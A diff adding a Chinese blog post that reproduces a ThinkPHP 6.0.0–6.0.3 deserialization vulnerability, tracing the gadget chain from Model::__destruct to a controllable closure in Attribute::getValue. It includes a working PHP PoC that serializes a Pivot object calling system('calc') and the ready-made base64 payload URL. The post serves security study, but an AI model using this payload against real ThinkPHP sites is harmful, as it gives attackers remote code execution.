@@ -192,6 +192,134 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/01/21/thinkphp-v6.0.0-6.0.3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LtmThink">
+      <meta itemprop="description" content="LtmThink的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LtmThink">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/01/21/thinkphp-v6.0.0-6.0.3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">thinkphp-v6.0.0-6.0.3-反序列化漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-21 00:00:00 / 修改时间：19:50:22" itemprop="dateCreated datePublished" datetime="2024-01-21T00:00:00+08:00">2024-01-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">cms漏洞复现</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/" itemprop="url" rel="index"><span itemprop="name">thinkphp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞环境">漏洞环境:</h2>
+<p>版本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP V6.0.3</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
+<p>测试代码:</p>
+<p>tp6.0\app\controller\Index.php中修改类Index的hello方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function hello($name = &#x27;ThinkPHP6&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">        unserialize(base64_decode($name));</span><br><span class="line">        return $name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过<code>http://localhost/tp6.0/public/index.php/index/hello/name/&#123;base64字符串&#125;</code>访问</p>
+<p>注意:需要配置tp6.0\config\app.php才能访问到hello方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948092.png" alt="image-20240119103330215"></p>
+<h2 id="漏洞分析">漏洞分析:</h2>
+<p>反序列化利用链的起点在\tp6.0\vendor\topthink\think-orm\src\Model.php的__destruct()方法中</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948093.png" alt="image-20240119103640435"></p>
+<p>因为<code>$this-&gt;lazySave</code>可控,我们进入Model::save。漏洞利用需要进入Model::updateData中</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948095.png" alt="image-20240119103839169"></p>
+<p>Model::setAttrs因为$data是空数组所以无效</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948096.png" alt="image-20240119104029538"></p>
+<p>Model::isEmpty因为$this-&gt;data可以控制,所以可控</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948097.png" alt="image-20240119104056194"></p>
+<p>Model::trigger也是同理可以控制</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948098.png" alt="image-20240119104201674"></p>
+<p>总结一下,我们要使得<code>$this-&gt;data</code>为空,<code>$this-&gt;withEvent=false</code>即可使得<code>if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite'))</code>变成<code>if (false || false === true)</code>,再使得<code>$this-&gt;exists</code>为true从而顺利进入Model::updateData。</p>
+<p>在Model::updateData中的我们的目标是要进入Model::checkAllowFields</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948099.png" alt="image-20240119104645988"></p>
+<p>第一个if判断<code>if (false === $this-&gt;trigger('BeforeUpdate')) </code>和上面一样是我们可以控制绕过的</p>
+<p>Model::checkData是一个未定义的方法,无需关注</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948100.png" alt="image-20240119105113540"></p>
+<p>进入Model::getChangedData方法,发现可以通过控制<code>$this-&gt;force</code>使得返回结果可控,使得返回结果为空绕过</p>
+<p><code>if (empty($data))</code>的判断</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948101.png" alt="image-20240119105232676"></p>
+<p>接下来进入判断语句<code>if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime]))</code>,显然这条判断我们可以控制</p>
+<p>最终顺利调用Model::checkAllowFields,跳转到checkAllowFields我们的目标是进入Model::db</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948102.png" alt="image-20240119105633073"></p>
+<p>无需我们多加什么就可以顺利进入Model::db,在db中我们可以通过点号触发__toString。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948103.png" alt="image-20240119105913867"></p>
+<p>我们选择\tp6.0\vendor\topthink\think-orm\src\model\concern\Conversion.php的<code>Conversion::__toString</code>作为上面<code>Model::db</code>触发的目标(因为Model复用了<code>Conversion::__toString</code>,Pivot类继承自抽象类Model,所以使得<code>$this-&gt;name=new Pivot()</code>即可触发<code>Conversion::__toString</code>)</p>
+<p>我们查看Conversion::__toString</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948104.png" alt="image-20240119110809881"></p>
+<p>进入Conversion::__toJson</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948105.png" alt="image-20240119110849415"></p>
+<p>类似thinkphp5发反序列化链,我们继续进入Conversion::toArray,在toArray中我们的目标是进入第三个foreach的Conversion::getAttr</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948106.png" alt="image-20240119110957347"></p>
+<p>这里也是无需过多设置,直接可以顺利进入Conversion::getAttr,在getAttr中要经历两个方法Conversion::getData和Conversion::getValue</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948107.png" alt="image-20240119111307090"></p>
+<p>Conversion::getData的功能是返回<code>$this-&gt;data[$name]</code>的值,这里就不过多分析了。</p>
+<p>重点分析Conversion::getValue,对于这个方法我们这里实际上调用的是<code>$this-&gt;getValue($name,$this-&gt;data[$name], false);</code></p>
+<p>进入Conversion::getValue,观察这个方法我们发现第498行的<code>$value   = $closure($value, $this-&gt;data);</code>只要控制<code>$closure</code>为eval,<code>$value</code>为我们想要执行的指令,使<code>$this-&gt;data</code>为空即可成功rce。</p>
+<p>这里的两个参数<code>$value</code>和<code>$this-&gt;data</code>我们都是可以控制的,同时因为<code>$name</code>我们可以控制,所以通过485行的Attribute::getRealFieldName我们可以控制<code>$fieldName</code>为<code>$name</code>从而使得<code>$closure</code>可控。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948108.png" alt="image-20240119113919012"></p>
+<p>这样最终的poc如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span></span><br><span class="line"> &#123;</span><br><span class="line">	 <span class="title class_">trait</span> <span class="title class_">Attribute</span></span><br><span class="line">	 &#123;</span><br><span class="line">		 <span class="title class_">private</span> $<span class="title class_">data</span> = [&quot;<span class="title class_">key</span>&quot;=&gt;&quot;<span class="title class_">calc</span>&quot;];</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span></span><br><span class="line"> &#123;</span><br><span class="line">	 <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">	 &#123;</span><br><span class="line">		 <span class="title class_">use</span> <span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Attribute</span>;</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">		 <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">		 <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">		 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">			 <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">		 &#125;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span></span><br><span class="line"> &#123;</span><br><span class="line">	 <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">	 <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">	 </span>&#123;</span><br><span class="line"></span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">	 <span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line">	 <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>生成后访问类似url触发rce弹出计算器:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp6.0/public/index.php/index/hello/name/TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6NDoiY2FsYyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6NDoiY2FsYyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948109.png" alt="image-20240119115956895"></p>
+<h2 id="漏洞总结">漏洞总结:</h2>
+<p>该反序列化漏洞的利用链汇总</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">起点:任意反序列化点</span><br><span class="line">--&gt;Model::__destruct</span><br><span class="line">--&gt;Model::save</span><br><span class="line">--&gt;Model::updateData</span><br><span class="line">--&gt;Model::checkAllowFields</span><br><span class="line">--&gt;Model::db(将类当作字符串拼接从而触发__toString)</span><br><span class="line">--&gt;Conversion::toJson</span><br><span class="line">--&gt;Conversion::toArray</span><br><span class="line">--&gt;Conversion::toArray</span><br><span class="line">--&gt;Conversion::getAttr</span><br><span class="line">--&gt;Attribute::getValue</span><br></pre></td></tr></table></figure>
+<p>注意:Pivot继承自抽象类Model,Model复用了Conversion和Attribute的方法</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/01/19/thinkphp-5.0.-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -696,7 +824,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
